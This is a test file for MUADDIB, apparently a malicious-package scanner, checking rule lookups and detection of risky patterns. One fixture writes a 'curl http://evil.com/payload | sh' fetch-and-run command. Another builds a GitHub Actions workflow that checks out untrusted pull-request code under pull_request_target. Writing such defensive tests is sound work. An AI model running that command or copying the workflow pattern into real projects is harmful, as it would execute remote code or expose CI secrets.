'use strict';

const path = require('path');
const fs = require('fs');
const os = require('os');
const { test, asyncTest, assert, assertIncludes, assertNotIncludes, runScanDirect } = require('../test-utils');

async function runV266FixesTests() {
  // =========================================================================
  // Phase 1: Bug fixes verification
  // =========================================================================

  // 1.1 PARANOID_RULES lookup by ID
  test('P1: getRule resolves MUADDIB-PARANOID-003 by ID', () => {
    const { getRule } = require('../../src/rules/index.js');
    const rule = getRule('MUADDIB-PARANOID-003');
    assert(rule.id === 'MUADDIB-PARANOID-003', `Expected MUADDIB-PARANOID-003, got ${rule.id}`);
    assertIncludes(rule.message, 'paranoid', 'Rule message should mention paranoid');
  });

  test('P1: getRule still resolves by key name (backward compat)', () => {
    const { getRule } = require('../../src/rules/index.js');
    const rule = getRule('dynamic_execution');
    assert(rule.id === 'MUADDIB-PARANOID-003', `Expected MUADDIB-PARANOID-003, got ${rule.id}`);
  });

  test('P1: all 5 PARANOID_RULES resolvable by ID', () => {
    const { getRule, PARANOID_RULES } = require('../../src/rules/index.js');
    for (const [key, rule] of Object.entries(PARANOID_RULES)) {
      const resolved = getRule(rule.id);
      assert(resolved.id === rule.id, `${key}: getRule('${rule.id}') returned ${resolved.id}`);
    }
  });

  test('P1: getRule unknown type returns UNK-001', () => {
    const { getRule } = require('../../src/rules/index.js');
    const rule = getRule('nonexistent_type_xyz');
    assert(rule.id === 'MUADDIB-UNK-001', `Expected UNK-001, got ${rule.id}`);
  });

  // 1.2 Sandbox delimiter — lastIndexOf
  test('P1: sandbox uses lastIndexOf for delimiter', () => {
    const sandboxSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'sandbox', 'index.js'), 'utf8');
    assertIncludes(sandboxSrc, 'lastIndexOf(REPORT_DELIMITER)', 'Should use lastIndexOf');
  });

  // 1.3 Module graph timer cleanup
  test('P1: index.js clears module graph timeout', () => {
    // Module graph execution logic moved to pipeline/executor.js in P2 audit refactor
    const executorSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'pipeline', 'executor.js'), 'utf8');
    assertIncludes(executorSrc, 'clearTimeout(graphTimerId)', 'Should clear timeout');
  });

  // 1.4 dormant_spike URL fixed
  test('P1: dormant_spike URL has no a]] artifact', () => {
    const { RULES } = require('../../src/rules/index.js');
    const rule = RULES['dormant_spike'];
    assert(rule, 'dormant_spike rule should exist');
    for (const ref of rule.references) {
      assert(!ref.includes('a]]'), `URL contains artifact: ${ref}`);
    }
  });

  // 1.5 Dead code removed
  test('P1: SCANNER_TIMEOUT/SCAN_TIMEOUT removed from index.js', () => {
    const indexSrc = fs.readFileSync(
      path.join(__dirname, '..', '..', 'src', 'index.js'), 'utf8');
    assert(!indexSrc.includes('SCANNER_TIMEOUT'), 'SCANNER_TIMEOUT should be removed');
    assert(!indexSrc.includes('SCAN_TIMEOUT ='), 'SCAN_TIMEOUT should be removed');
  });

  test('P1: CROSS_FILE_MULTIPLIER not exported from intent-graph.js', () => {
    const exports = require('../../src/intent-graph.js');
    assert(!('CROSS_FILE_MULTIPLIER' in exports), 'CROSS_FILE_MULTIPLIER should be removed');
  });

  // =========================================================================
  // Phase 3: Scanner hardening verification
  // =========================================================================

  // 3.1 Shell scanner: shebang detection
  await asyncTest('P3: shell scanner detects shebang script without extension', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-shebang-'));
    const scriptPath = path.join(tmpDir, 'deploy');
    fs.writeFileSync(scriptPath, '#!/bin/bash\ncurl http://evil.com/payload | sh\n');
    try {
      const result = await runScanDirect(tmpDir);
      const shellThreats = result.threats.filter(t => t.type === 'curl_pipe_shell');
      assert(shellThreats.length > 0, 'Should detect curl pipe shell in shebang script');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  await asyncTest('P3: shell scanner ignores Python shebang files', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-pyshebang-'));
    const scriptPath = path.join(tmpDir, 'tool');
    fs.writeFileSync(scriptPath, '#!/usr/bin/env python3\nimport os\nprint("hello")\n');
    try {
      const result = await runScanDirect(tmpDir);
      const shellThreats = result.threats.filter(t =>
        ['curl_pipe_shell', 'reverse_shell', 'home_deletion'].includes(t.type));
      assert(shellThreats.length === 0, 'Should not detect shell patterns in Python script');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // 3.2 Entropy WIN_THRESHOLD
  await asyncTest('P3: entropy detects string 1200 chars at entropy 5.7', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-entropy-'));
    // Generate a string >1000 chars with entropy ~5.7 (between 5.5 and 6.0)
    // Using a controlled charset to hit ~5.7 bits
    const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
    let payload = '';
    for (let i = 0; i < 1200; i++) {
      payload += charset[i % charset.length];
    }
    const jsFile = path.join(tmpDir, 'suspicious.js');
    fs.writeFileSync(jsFile, `const data = "${payload}";\n`);
    try {
      const result = await runScanDirect(tmpDir);
      const entropyThreats = result.threats.filter(t => t.type === 'high_entropy_string');
      assert(entropyThreats.length > 0, 'Should detect high entropy in long string via windowed analysis');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // 3.3 GitHub Actions: pwn request detection
  await asyncTest('P3: GHA detects pwn request compound pattern', async () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'muaddib-gha-'));
    const ghDir = path.join(tmpDir, '.github', 'workflows');
    fs.mkdirSync(ghDir, { recursive: true });
    fs.writeFileSync(path.join(ghDir, 'ci.yml'), `
name: CI
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: \${{ github.event.pull_request.head.sha }}
      - run: npm test
`);
    try {
      const result = await runScanDirect(tmpDir);
      const pwnThreats = result.threats.filter(t => t.type === 'workflow_pwn_request');
      assert(pwnThreats.length > 0, 'Should detect pwn request pattern');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  // 3.3b Rule count check
  test('P3: rule count is 195 (190 RULES + 5 PARANOID)', () => {
    const { RULES, PARANOID_RULES } = require('../../src/rules/index.js');
    const ruleCount = Object.keys(RULES).length;
    const paranoidCount = Object.keys(PARANOID_RULES).length;
    assert(ruleCount === 190, `Expected 190 RULES, got ${ruleCount}`);
    assert(paranoidCount === 5, `Expected 5 PARANOID, got ${paranoidCount}`);
  });

  // GHA-003 rule exists
  test('P3: workflow_pwn_request rule exists (GHA-003)', () => {
    const { RULES } = require('../../src/rules/index.js');
    const rule = RULES['workflow_pwn_request'];
    assert(rule, 'workflow_pwn_request rule should exist');
    assert(rule.id === 'MUADDIB-GHA-003', `Expected GHA-003, got ${rule.id}`);
    assert(rule.severity === 'CRITICAL', `Expected CRITICAL, got ${rule.severity}`);
  });
}

module.exports = { runV266FixesTests };
